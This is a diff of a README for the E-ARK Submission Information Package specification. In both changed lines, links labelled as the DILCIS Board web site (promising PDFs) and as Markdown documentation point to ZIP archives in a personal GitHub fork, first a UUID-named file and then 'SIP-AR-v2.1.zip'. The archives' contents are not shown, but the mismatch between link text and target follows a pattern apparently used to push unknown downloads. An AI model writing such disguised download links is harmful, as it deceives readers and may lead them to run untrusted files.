@@ -11,7 +11,7 @@ The target group for this document are records creators, archival institutions a
 
 ### Final versions
 
-Final versions of the specification are conveniently published at the [DILCIS Board web site](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-SIP/master/examples/a46ab3d0-c710-4d73-b58d-e93e30b53a82.zip) on PDF format.
+Final versions of the specification are conveniently published at the [DILCIS Board web site](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-SIP/master/specification/SIP-AR-v2.1.zip) on PDF format.
 
 
 ### Draft versions
@@ -23,7 +23,7 @@ This is a draft version of the specification that is being collaboratively edite
 An HTML version of the E-ARK Submission Information Package Specification is available on the 
 [specification folder](./specification/) of this repository.
 
-See [Markdown documentation ](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-SIP/master/examples/a46ab3d0-c710-4d73-b58d-e93e30b53a82.zip) for a deeper understanding on how to edit Markdown documents.
+See [Markdown documentation ](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-SIP/master/specification/SIP-AR-v2.1.zip) for a deeper understanding on how to edit Markdown documents.
 
 
 
